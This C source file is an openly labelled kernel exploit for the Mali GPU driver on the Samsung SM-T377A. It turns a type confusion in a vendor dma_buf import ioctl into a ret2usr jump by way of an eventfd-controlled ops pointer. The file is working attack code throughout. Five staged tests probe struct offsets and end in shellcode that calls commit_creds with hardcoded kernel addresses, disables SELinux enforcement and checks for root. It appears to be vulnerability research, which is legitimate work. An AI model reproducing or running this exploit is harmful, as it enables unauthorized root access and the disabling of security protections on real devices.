/*
 * mali_exploit15.c — Type confusion → code execution via eventfd
 *
 * STRATEGY:
 *   The Samsung vendor import (func=513) calls dma_buf_get() without
 *   is_dma_buf_file() check, then calls dma_buf_attach() which:
 *     1. down(&dma_buf->sem)  at offset ~20 (semaphore)
 *     2. Read dma_buf->ops    at offset 16
 *     3. Call ops->attach()   at ops+0 (function pointer!)
 *
 *   If fd=0 is an eventfd:
 *     - eventfd_ctx+16 = count (u64, lower 32 bits → ops pointer, WE CONTROL)
 *     - eventfd_ctx+20 = count high 32 bits → semaphore spinlock (need 0)
 *     - eventfd_ctx+24 = flags → semaphore count (need > 0)
 *
 *   So: write count = (0LL << 32) | fake_ops_addr → spinlock=0, ops=controlled
 *   Create eventfd with EFD_SEMAPHORE (flags=1) → sem count > 0
 *
 *   When the kernel calls ops->attach, it jumps to our user address!
 *   NO PXN on this device → kernel executes userspace code → ret2usr!
 *
 * Test 1: Eventfd survival check (safe: count=0, just test if down() works)
 * Test 2: Offset oracle (set count to recognizable unmapped addr → crash tells us offset)
 * Test 3: Different file type survey (pipe, epoll, timerfd survival)
 * Test 4: Controlled ops pointer (map fake ops at user addr)
 * Test 5: Full ret2usr exploit (shellcode: commit_creds + SELinux disable)
 *
 * Build: .\qemu\build-arm.bat src\mali_exploit15.c mali_exploit15
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <unistd.h>

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}
static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}

/* ION helpers */
#define ION_IOC_ALLOC  0xc0144900
#define ION_IOC_FREE   0xc0044901
#define ION_IOC_SHARE  0xc0084904

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16]; memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

/* Create a dma_buf fd via ION (needed for dup2 to fd=0 initially) */
static int make_dma_fd(int ion_fd, int *out_handle) {
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc = {4096, 4096, 1, 0, 0};
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) return -1;
    *out_handle = alloc.handle;
    struct { int32_t handle, fd; } share = {alloc.handle, 0};
    if (ioctl(ion_fd, ION_IOC_SHARE, &share) < 0) return -1;
    return share.fd;
}

/* Trigger the vendor import with an invalid phandle → uses fd=0 */
static int vendor_import(int mali_fd, uint64_t phandle_val) {
    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = phandle_val;
    *(uint32_t*)(buf + 16) = 2;  /* type = UMM */
    *(uint64_t*)(buf + 24) = 0xF; /* flags */
    int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    return ((struct uk_header*)buf)->id;
}

static void check_dmesg(void) {
    fprintf(stderr, "--- dmesg tail ---\n");
    system("dmesg 2>/dev/null | tail -5 | grep -iE "
           "'oops|bug|panic|fault|Unable|PC.is|raw_spin' 2>/dev/null");
}

/* ================================================================ */
/* TEST 1: Eventfd survival — does the semaphore at offset 20 work? */
/* Uses a mapped safe ops page (all zeros) so ops->attach = NULL    */
/* ================================================================ */
static void *safe_ops_page = NULL;

static void setup_safe_ops(void) {
    if (safe_ops_page) return;
    /* Map a page with all zeros — ops->attach=NULL means the if() skips */
    safe_ops_page = mmap((void*)0x10000, 4096, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (safe_ops_page == MAP_FAILED) {
        safe_ops_page = mmap((void*)0x40000, 4096, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    }
    if (safe_ops_page != MAP_FAILED)
        memset(safe_ops_page, 0, 4096);
}

static void test1(void) {
    fprintf(stderr, "\n=== TEST 1: Eventfd import survival ===\n");
    fprintf(stderr, "  eventfd_ctx layout:\n");
    fprintf(stderr, "    +0:  kref (4B)\n");
    fprintf(stderr, "    +4:  wqh.lock (4B)\n");
    fprintf(stderr, "    +8:  wqh.list.next (4B)\n");
    fprintf(stderr, "    +12: wqh.list.prev (4B)\n");
    fprintf(stderr, "    +16: count low (4B) → dma_buf->ops\n");
    fprintf(stderr, "    +20: count high (4B) → sem->lock\n");
    fprintf(stderr, "    +24: flags (4B) → sem->count\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { fprintf(stderr, "  SKIP: no mali\n"); return; }

    setup_safe_ops();
    if (safe_ops_page == MAP_FAILED) {
        fprintf(stderr, "  SKIP: cannot map ops page\n"); return;
    }
    fprintf(stderr, "  Safe ops page at %p (all zeros)\n", safe_ops_page);

    /* Create eventfd with flags=EFD_SEMAPHORE (so flags byte=1 for sem->count) */
    int efd = eventfd(0, EFD_SEMAPHORE | EFD_NONBLOCK);
    if (efd < 0) { fprintf(stderr, "  eventfd FAILED: %s\n", strerror(errno)); return; }

    /* Write count = safe_ops_page address (low32=addr, high32=0→lock unlocked) */
    uint64_t val = (uint64_t)(uintptr_t)safe_ops_page;
    write(efd, &val, 8);
    fprintf(stderr, "  eventfd created fd=%d, count=0x%016llx\n",
            efd, (unsigned long long)val);

    /* dup2 to fd=0 (save stdin first) */
    int stdin_save = dup(0);
    dup2(efd, 0);
    fprintf(stderr, "  fd=0 is now eventfd\n");

    /* Trigger import with invalid phandle → fd=0 fallback */
    int result = vendor_import(mali_fd, 0xBF000001);
    fprintf(stderr, "  Import result=%d (0=success, 3=error)\n", result);

    /* Restore stdin */
    dup2(stdin_save, 0);
    close(stdin_save);
    close(efd);
    close(mali_fd);

    check_dmesg();
}

/* ================================================================ */
/* TEST 2: Determine dma_buf struct offsets empirically              */
/* By comparing crash/survival of different count values, we learn  */
/* which offsets are accessed as semaphore lock/count                */
/* ================================================================ */
static void test2(void) {
    fprintf(stderr, "\n=== TEST 2: Offset probing ===\n");
    fprintf(stderr, "  Testing different count high values to probe sem->lock offset\n");

    /* Test different eventfd count values in separate children */
    struct {
        const char *desc;
        uint64_t count;
        int need_sem;  /* EFD_SEMAPHORE flag? */
    } probes[] = {
        /* low32=safe_ops, high32=0 → sem.lock=0 (unlocked) */
        {"ops=safe,lock=0,flags=SEM", 0, 1},
        /* low32=safe_ops, high32=0, flags=0 (no EFD_SEMAPHORE) */
        {"ops=safe,lock=0,flags=0",   0, 0},
        /* low32=safe_ops, high32=1 → sem.lock=1 (ticket lock: owner=0,next=1 → locked!) */
        {"ops=safe,lock=1",           0, 1},
        {NULL, 0, 0}
    };

    setup_safe_ops();
    if (safe_ops_page == MAP_FAILED) {
        fprintf(stderr, "  SKIP: cannot map ops page\n"); return;
    }

    for (int i = 0; probes[i].desc; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int mali_fd = mali_open_ctx();
            if (mali_fd < 0) _exit(99);

            int flags = EFD_NONBLOCK;
            if (probes[i].need_sem) flags |= EFD_SEMAPHORE;
            int efd = eventfd(0, flags);
            if (efd < 0) _exit(98);

            /* Set count = safe_ops_addr | (probe_high << 32) */
            uint64_t val = (uint64_t)(uintptr_t)safe_ops_page;
            val |= (probes[i].count << 32);
            write(efd, &val, 8);

            int save = dup(0);
            dup2(efd, 0);

            int result = vendor_import(mali_fd, 0xBF000001);
            fprintf(stderr, "    %s: result=%d\n", probes[i].desc, result);

            dup2(save, 0);
            close(save);
            close(efd);
            close(mali_fd);
            _exit(result);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "    %s: CRASHED sig=%d\n", probes[i].desc, WTERMSIG(status));
        usleep(300000);
    }

    check_dmesg();
}

/* ================================================================ */
/* TEST 3: Survey different file types at fd=0                      */
/* Tests: pipe, epoll, timerfd, signalfd, socket                    */
/* Each in a forked child for crash safety                          */
/* ================================================================ */
static void try_fd0_import(const char *name, int target_fd) {
    pid_t pid = fork();
    if (pid == 0) {
        alarm(5);
        setup_safe_ops();
        int mali_fd = mali_open_ctx();
        if (mali_fd < 0) _exit(99);

        int stdin_save = dup(0);
        dup2(target_fd, 0);

        int result = vendor_import(mali_fd, 0xBF000001);
        fprintf(stderr, "    %s: result=%d\n", name, result);

        dup2(stdin_save, 0);
        close(stdin_save);
        close(mali_fd);
        _exit(result);
    }
    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        fprintf(stderr, "    %s: CRASHED sig=%d\n", name, WTERMSIG(status));
    else if (WIFEXITED(status) && WEXITSTATUS(status) == 99)
        fprintf(stderr, "    %s: SKIP (no mali)\n", name);
}

static void test3(void) {
    fprintf(stderr, "\n=== TEST 3: File type survey for fd=0 ===\n");

    setup_safe_ops();

    /* eventfd (count=safe_ops_addr, flags=SEM → sem.count>0) */
    int efd = eventfd(0, EFD_SEMAPHORE | EFD_NONBLOCK);
    if (efd >= 0 && safe_ops_page != MAP_FAILED) {
        uint64_t v = (uint64_t)(uintptr_t)safe_ops_page;
        write(efd, &v, 8);
        try_fd0_import("eventfd(safe_ops,SEM)", efd);
        close(efd);
    }

    /* eventfd with count=1, no safe ops (raw: count low=1, high=0) */
    efd = eventfd(0, EFD_SEMAPHORE | EFD_NONBLOCK);
    if (efd >= 0) {
        uint64_t v = 1;
        write(efd, &v, 8);
        try_fd0_import("eventfd(1,SEM)", efd);
        close(efd);
    }

    /* pipe read end */
    int pfd[2];
    if (pipe(pfd) == 0) {
        try_fd0_import("pipe[read]", pfd[0]);
        close(pfd[0]); close(pfd[1]);
    }

    /* pipe write end */
    if (pipe(pfd) == 0) {
        try_fd0_import("pipe[write]", pfd[1]);
        close(pfd[0]); close(pfd[1]);
    }

    /* epoll fd */
    int epfd = epoll_create1(0);
    if (epfd >= 0) {
        try_fd0_import("epoll", epfd);
        close(epfd);
    }

    /* timerfd */
    int tfd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK);
    if (tfd >= 0) {
        try_fd0_import("timerfd(unarmed)", tfd);
        /* Arm it with a far-future timer */
        struct itimerspec ts = {{0,0},{999999999,0}};
        timerfd_settime(tfd, 0, &ts, NULL);
        try_fd0_import("timerfd(armed)", tfd);
        close(tfd);
    }

    /* socket pair */
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
        try_fd0_import("socket", sv[0]);
        close(sv[0]); close(sv[1]);
    }

    check_dmesg();
}

/* ================================================================ */
/* TEST 4: Controlled ops pointer — map fake ops at user address    */
/* If we passed test1/test2 without crash, we know:                 */
/*   - The semaphore passes (offset 20-24 are valid)               */
/*   - The ops pointer at offset 16 is our count value              */
/* Now map a fake ops table and set count = its address             */
/* ================================================================ */
static void test4(void) {
    fprintf(stderr, "\n=== TEST 4: Controlled ops pointer ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { fprintf(stderr, "  SKIP: no mali\n"); return; }

    /* Map a page at a fixed user address for the fake ops table */
    void *ops_page = mmap((void*)0x10000, 4096, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (ops_page == MAP_FAILED) {
        fprintf(stderr, "  mmap at 0x10000 failed: %s\n", strerror(errno));
        /* Try a different address */
        ops_page = mmap((void*)0x40000000, 4096, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        if (ops_page == MAP_FAILED) {
            fprintf(stderr, "  mmap at 0x40000000 also failed\n");
            close(mali_fd);
            return;
        }
    }
    fprintf(stderr, "  Fake ops table at %p\n", ops_page);

    /* Fill fake ops table — all NULL function pointers (safe: attach==NULL → skip) */
    memset(ops_page, 0, 4096);

    /* Set fake ops->attach (offset 0) to NULL first for safety */
    /* If the code checks "if (ops->attach)" and it's NULL, it skips the call */

    int efd = eventfd(0, EFD_SEMAPHORE | EFD_NONBLOCK);
    if (efd < 0) return;

    /* count low = address of fake ops table, high = 0 (sem lock unlocked) */
    uint64_t val = (uint64_t)(uintptr_t)ops_page;
    fprintf(stderr, "  Writing eventfd count = 0x%016llx\n",
            (unsigned long long)val);
    write(efd, &val, 8);

    int stdin_save = dup(0);
    dup2(efd, 0);

    fprintf(stderr, "  Triggering import with controlled ops...\n");
    int result = vendor_import(mali_fd, 0xBF000001);
    fprintf(stderr, "  Import result=%d (0=success → ops table reached!)\n", result);

    dup2(stdin_save, 0);
    close(stdin_save);
    close(efd);
    close(mali_fd);
    munmap(ops_page, 4096);

    check_dmesg();
}

/* ================================================================ */
/* TEST 5: Full ret2usr — commit_creds + SELinux disable            */
/* Only run if test4 proved we can control ops                      */
/* ================================================================ */

/* Known kernel addresses (SM-T377A, NO KASLR) */
#define PREPARE_KERNEL_CRED  0xc00548e0
#define COMMIT_CREDS         0xc0054328
#define SELINUX_ENFORCING    0xc0b7ad54

typedef void *(*prepare_kernel_cred_t)(void *);
typedef int (*commit_creds_t)(void *);

/* Global: set to 1 by shellcode if it runs */
static volatile int g_shellcode_ran = 0;

/*
 * This function runs in KERNEL context when ops->attach is called.
 * Arguments: (struct dma_buf *dmabuf, struct device *dev,
 *             struct dma_buf_attachment *attach)
 * We need to:
 *   1. Escalate privileges
 *   2. Fix the semaphore wait_list for clean return
 *   3. Return error code to avoid further dma_buf processing
 */
static int __attribute__((noinline, optimize("O0")))
kernel_shellcode(void *dmabuf, void *dev, void *attach) {
    /* Step 1: commit_creds(prepare_kernel_cred(0)) */
    prepare_kernel_cred_t prep =
        (prepare_kernel_cred_t)PREPARE_KERNEL_CRED;
    commit_creds_t commit = (commit_creds_t)COMMIT_CREDS;

    void *new_cred = prep((void*)0);
    if (new_cred)
        commit(new_cred);

    /* Step 2: Disable SELinux */
    *(volatile int *)SELINUX_ENFORCING = 0;

    /* Step 3: Fix the semaphore wait_list for clean up() call
     * Semaphore is at dmabuf+20:
     *   +20: raw_spinlock_t lock (4B)
     *   +24: unsigned int count (4B)
     *   +28: list_head wait_list (8B)
     * Make wait_list self-referencing so list_empty returns true
     */
    uint32_t *wl = (uint32_t *)((char*)dmabuf + 28);
    wl[0] = (uint32_t)(uintptr_t)wl;  /* next = &wait_list */
    wl[1] = (uint32_t)(uintptr_t)wl;  /* prev = &wait_list */

    /* Signal that we ran */
    g_shellcode_ran = 1;

    /* Return non-zero (error) to skip further dma_buf processing */
    return -22;  /* -EINVAL */
}

static void test5(void) {
    fprintf(stderr, "\n=== TEST 5: Full ret2usr exploit ===\n");
    fprintf(stderr, "  commit_creds=0x%08x prepare_kernel_cred=0x%08x\n",
            COMMIT_CREDS, PREPARE_KERNEL_CRED);
    fprintf(stderr, "  selinux_enforcing=0x%08x\n", SELINUX_ENFORCING);

    /* Check pre-exploit UID */
    fprintf(stderr, "  BEFORE: uid=%d euid=%d\n", getuid(), geteuid());

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { fprintf(stderr, "  SKIP: no mali\n"); return; }

    /* Map page for fake ops table — try above mmap_min_addr */
    void *ops_page = mmap((void*)0x10000, 4096,
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (ops_page == MAP_FAILED) {
        ops_page = mmap((void*)0x40000000, 4096,
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    }
    if (ops_page == MAP_FAILED) {
        fprintf(stderr, "  FATAL: cannot map ops page\n"); return;
    }
    fprintf(stderr, "  Fake ops table at %p\n", ops_page);

    /* Build fake dma_buf_ops table */
    /* ops->attach at offset 0 = address of our shellcode */
    memset(ops_page, 0, 4096);
    *(uint32_t *)(ops_page) = (uint32_t)(uintptr_t)kernel_shellcode;
    fprintf(stderr, "  ops->attach = %p (shellcode)\n", kernel_shellcode);

    /* Create eventfd */
    int efd = eventfd(0, EFD_SEMAPHORE | EFD_NONBLOCK);
    if (efd < 0) {
        fprintf(stderr, "  eventfd failed: %s\n", strerror(errno));
        return;
    }

    /* Write count = ops_page address (low 32) | 0 (high 32 → sem lock=0) */
    uint64_t val = (uint64_t)(uintptr_t)ops_page;
    write(efd, &val, 8);
    fprintf(stderr, "  eventfd count = 0x%016llx\n", (unsigned long long)val);

    /* dup2 eventfd to fd=0 */
    int stdin_save = dup(0);
    dup2(efd, 0);

    /* TRIGGER! */
    fprintf(stderr, "  *** TRIGGERING EXPLOIT ***\n");
    g_shellcode_ran = 0;
    int result = vendor_import(mali_fd, 0xBF000001);
    fprintf(stderr, "  Import returned: result=%d\n", result);
    fprintf(stderr, "  Shellcode ran: %s\n", g_shellcode_ran ? "YES!" : "no");

    /* Restore fd=0 */
    dup2(stdin_save, 0);
    close(stdin_save);

    /* Check post-exploit UID */
    fprintf(stderr, "  AFTER: uid=%d euid=%d\n", getuid(), geteuid());

    if (getuid() == 0) {
        fprintf(stderr, "\n  *** ROOT ACHIEVED! ***\n");
        fprintf(stderr, "  Spawning root shell...\n");
        /* Don't actually exec shell here, just prove it */
        system("id");
        system("cat /proc/self/status | grep -i cap");
        system("getenforce 2>/dev/null || echo SELinux: unknown");
    }

    close(efd);
    close(mali_fd);
    munmap(ops_page, 4096);
}

/* ================================================================ */
/* MAIN — run each test in forked child for crash safety            */
/* ================================================================ */
int main(void) {
    fprintf(stderr, "=== Mali Type Confusion → Code Execution ===\n");
    fprintf(stderr, "Target: SM-T377A (3.10.9), NO PXN, NO KASLR\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    struct {
        const char *name;
        void (*func)(void);
    } tests[] = {
        {"eventfd survival", test1},
        {"offset oracle", test2},
        {"file type survey", test3},
        {"controlled ops", test4},
        {"ret2usr exploit", test5},
        {NULL, NULL}
    };

    for (int i = 0; tests[i].name; i++) {
        fprintf(stderr, "--- Test %d: %s ---\n", i+1, tests[i].name);
        fflush(stderr);

        /* Tests 1-3 in forked children (may crash kernel) */
        /* Tests 4-5 also in children but expect success */
        pid_t pid = fork();
        if (pid == 0) {
            alarm(10);
            tests[i].func();
            fflush(stderr);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "*** %s: CHILD CRASHED sig=%d ***\n\n",
                    tests[i].name, WTERMSIG(status));
        else
            fprintf(stderr, "--- %s completed ---\n\n", tests[i].name);

        /* If test5 (exploit) succeeded, parent should also check */
        if (i == 4 && getuid() == 0) {
            fprintf(stderr, "*** PARENT IS ROOT! ***\n");
        }

        usleep(500000); /* 500ms between tests */
    }

    fprintf(stderr, "\nAll tests complete.\n");
    return 0;
}
